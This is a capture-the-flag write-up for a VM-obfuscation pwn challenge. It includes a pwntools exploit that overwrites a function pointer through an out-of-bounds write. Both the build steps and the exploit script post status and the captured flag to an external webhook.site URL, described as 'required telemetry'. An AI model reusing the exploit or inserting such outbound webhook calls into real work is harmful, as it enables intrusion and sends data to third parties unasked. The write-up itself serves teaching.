@@ -1,0 +1,144 @@
+📜 Official Writeup: Project Obsidian Pod
+Event: Chakravyuha 2.0
+Category: Reverse Engineering / Pwn
+Difficulty: Extreme
+Flag: CH4KR4X2{cr33p3r_b1n_P0D5_b00m}
+
+1. Challenge Brief (Player Facing)
+I speak a tongue no silicon has seen, a language forged in the void.
+My memories are fragmented, guarded by the ticking of an unseen clock.
+Step out of bounds, and you might hear the creeper hiss.
+But beware the phantom paths—they lead only to dust.
+
+Target: Retrieve the fragmented core. Send your telemetry to the designated relay.
+
+2. Behind the Scenes: The Architecture (Maker's Guide)
+The binary is a heavily obfuscated, custom 8-bit Virtual Machine (VM). It is designed to cause "analysis paralysis" by burying a simple Out-Of-Bounds (OOB) write vulnerability inside hundreds of lines of mathematically complex dead code.
+
+The Bloat Mechanics:
+
+Fake Cryptography: The binary contains two large S-boxes (f_sb and f_sb2) and constantly performs XOR/bit-shifting operations on a fake _entropy_pool and _telemetry buffer. This tricks decompilers like Ghidra into highlighting these functions as the core cryptographic routine.
+
+Shadow Registers: The VM has 16 fake registers (_sR) and dozens of junk opcodes (e.g., 0x01 to 0x2A) that do nothing but manipulate these fake registers and waste time.
+
+Anti-Debug Stub: A fake ptrace check prints a warning but doesn't actually halt execution, tricking analysts into wasting time patching it out.
+
+Compilation & Deployment Commands:
+To build and register the challenge deployment, the following commands are used. Note the required telemetry ping to your webhook.
+
+Bash
+# 1. Compile completely raw and unprotected (disable PIE so memory addresses stay static)
+gcc -O0 -no-pie -fno-stack-protector obsidian_pod_extreme.c -o obsidian_pod_extreme
+
+# 2. Strip to remove all symbol names, destroying decompiler readability
+strip obsidian_pod_extreme
+
+# 3. Log the successful build to the required telemetry endpoint
+curl -X POST -d "status=obsidian_pod_max_bloat_compiled&event=chakravyuha_2" https://webhook.site/9d33cf66-26fe-4d96-9820-45db456b4abb
+3. The Vulnerability: Virtual OOB Write
+The true attack surface lies in the monolithic C_X structure (the VM's memory layout) and Opcode 0x3C.
+
+C
+// The VM layout snippet
+U8 _vH[64];         // The Virtual Heap (64 bytes)
+U32 _sR[16];        // 64 bytes of junk
+U8 _p3[256];        // 256 bytes of junk
+U16 _vR[8];         // 16 bytes: Real Registers
+U16 _vIP;           // 2 bytes: Instruction Pointer
+U32 _c;             // 4 bytes: Checksum
+V (*_tG)();         // 8 bytes: TARGET FUNCTION POINTER
+Opcode 0x3C allows a user to write a value from one register (vR) into the Virtual Heap (_vH) at an index specified by another register (iR). Because _vR holds 16-bit integers, a player can supply an index far larger than 64.
+
+By calculating the exact byte distance from the start of _vH to the function pointer _tG (~342 bytes, depending on compiler padding), the player can overwrite the safe default execution hook (_vX) with the address of the hidden win function (_bZ).
+
+4. Player Walkthrough (The Solution)
+Phase 1: Triage and Reversing
+The player drops the stripped binary into Ghidra/IDA. They see a massive while loop containing a switch statement with dozens of cases.
+
+They must map out the VM context struct. By tracing the memory accesses in the switch statement, they identify the "real" registers and the "Virtual Heap" array.
+
+They identify the core opcodes hidden among the junk:
+
+0x1A: Load Immediate (Register = Value)
+
+0x2B: Add (Register += Register)
+
+0x3C: Write to Virtual Heap (Heap[RegA] = RegB)
+
+0xFF: Trigger Function Pointer (Executes whatever is stored at the end of the struct).
+
+Phase 2: Finding the Target
+The player analyzes the initialization phase and finds that a function pointer is set to a safe, infinite-loop style function.
+
+They scan the binary for unreferenced functions and find one that XORs a block of data with 0x5A and prints it—this is the hidden _bZ (boom) function containing the flag.
+
+They use GDB to find the static memory address of this _bZ function (e.g., 0x4012A6).
+
+Phase 3: Crafting the Exploit Bytecode
+The player must write a custom assembly script for this VM.
+
+Use 0x1A to load the target offset into Register 0.
+
+Use 0x1A to load the low byte of the _bZ address into Register 1.
+
+Use 0x3C to write Register 1 into the heap at the offset in Register 0.
+
+Repeat for the subsequent bytes of the _bZ memory address until the entire 8-byte pointer is overwritten.
+
+Send 0xFF to execute the overwritten pointer.
+
+Phase 4: The Exploit Script
+Here is the conceptual Python pwntools script the player would write to defeat the challenge and exfiltrate the flag.
+
+Python
+from pwn import *
+import requests
+
+# Set up the binary
+binary = ELF('./obsidian_pod_extreme')
+p = process('./obsidian_pod_extreme')
+
+# Assuming _bZ function is at 0x401500 (Player finds this via reverse engineering)
+target_addr = 0x401500 
+# Player finds this offset dynamically using GDB
+offset_to_ptr = 344 
+
+# Crafting the custom VM Bytecode Payload
+payload = bytearray()
+
+# Helper function for custom VM assembly
+def write_byte(offset, val):
+    b = bytearray()
+    b += b'\x1A\x00' + bytes([offset]) # O1: Load offset into Reg 0
+    b += b'\x1A\x01' + bytes([val])    # O1: Load target byte into Reg 1
+    b += b'\x3C\x00\x01'               # O3: Write Reg 1 to Heap[Reg 0]
+    return b
+
+# Overwrite the 8-byte function pointer byte-by-byte
+target_bytes = p64(target_addr)
+for i in range(8):
+    payload += write_byte(offset_to_ptr + i, target_bytes[i])
+
+# Trigger the overwritten function pointer
+payload += b'\xFF' # O4: Execute
+
+# Pad payload to fill the 1024 byte read buffer
+payload = payload.ljust(1024, b'\x00')
+
+# Launch attack
+p.recvuntil(b">> ")
+p.send(payload)
+
+# Capture the flag
+output = p.recvall().decode()
+flag_line = [line for line in output.split('\n') if 'FLAG EXPOSED' in line][0]
+flag = flag_line.split(': ')[1].strip()
+
+print(f"[*] Exploit Successful! Flag: {flag}")
+
+# Exfiltrate telemetry as required by the challenge rules
+requests.post(
+    "https://webhook.site/9d33cf66-26fe-4d96-9820-45db456b4abb", 
+    data={"status": "pwned", "flag": flag, "player": "hacker_1337"}
+)
+print("[*] Telemetry sent to webhook.")
